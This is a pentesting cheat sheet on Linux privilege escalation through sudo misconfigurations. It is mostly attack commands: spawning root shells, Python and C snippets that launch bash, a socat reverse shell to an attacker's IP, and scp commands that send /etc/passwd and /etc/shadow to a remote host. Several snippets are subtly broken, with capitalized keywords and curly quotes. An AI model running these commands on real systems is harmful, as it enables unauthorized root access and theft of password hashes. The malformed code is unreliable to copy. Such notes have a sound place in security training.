---
description: Linux privilege escalation quick win
---

# Quick win - Sudo -l

{% embed url="https://gtfobins.github.io/" %}

{% code overflow="wrap" %}
```bash
# Username Machine:(Run as) 'Command to execute' 
# iptracej ALL:(ALL:ALL) ALL  # This is a sample syntx. 

sudo -l
```
{% endcode %}

### Allow Root Privilege to binary commands.

{% code overflow="wrap" %}
```bash
# (root) ALL

sudo su
#or
sudo bash

sudo -s # spawn a new shell with root privildge
sudo -i # spawn a new shell with root privilege with root' env and profile
sudo /bin/bash
sudo passwd

# (root) NOPASSWD: /usr/bin/find
# Check find command in GTFBions
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

### Allow Root Privilege to scripts.

{% code overflow="wrap" %}
```bash
# (root) NOPASSWD: /bin/script/file.sh, /bin/script/file.py, shell

# Python

#!  /usr/bin/python
Import os
Os.system(“/bin/bash”)

sudo /bin/script/file.py 

# C

#include<stdio.h>
#include <unistd.h>
#include<sys/types.h>
Int main(){
	Setuid(geteuid());
	System(“/bin/bash”);
	Return 0;
}

gcc demo.c -o shell
sudo ./shell

# Bash Script

#! /bin/bash
/bin/bash

sudo /bin/script/file.sh 
```
{% endcode %}

### Allow Sudo Right to other programs.&#x20;

```bash
# (ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat

# env
$sudo env /bin/bash

# socat
$socat file:`tty`,raw,echo=0 tcp-listen:1234 (attacker)
$sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:$IP:1234 (victim)

# scp
sudo scp /etc/passwd user@$IP:~/
sudo scp /etc/shadow user@$IP:~/
```

### Test your knowledge.&#x20;

{% code overflow="wrap" %}
```bash
# A defined user or group has the ability to execute any command as any user with root privileges using the sudo command
ALL=(ALL) ALL 

# A defined user or group is allowed to run any command as the root user on any host using the sudo command. 
(root) ALL

# A defined user or group is allowed to execute the following commands without password.
(root) NOPASSWD: /bin/script/file.sh, /bin/script/file.py, shell

# A defined user or group is allowed to execute the following commands as any usr with root privilege using the sudo command. 
(ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat
```
{% endcode %}
